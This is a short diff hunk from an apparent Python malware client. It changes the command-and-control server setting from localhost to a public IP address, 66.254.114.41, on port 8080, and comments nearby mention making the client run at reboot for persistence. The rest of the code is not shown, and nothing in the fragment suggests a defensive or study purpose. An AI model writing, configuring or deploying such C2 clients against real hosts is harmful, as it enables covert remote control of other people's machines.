@@ -934,8 +934,8 @@ def _sheol():
 
 def main():
     # IP/Port to C2 server
-    EIP = '127.0.0.1'
-    PRT = 80
+    EIP = '66.254.114.41'
+    PRT = 8080
     
     
     # ensure client run @ reboot
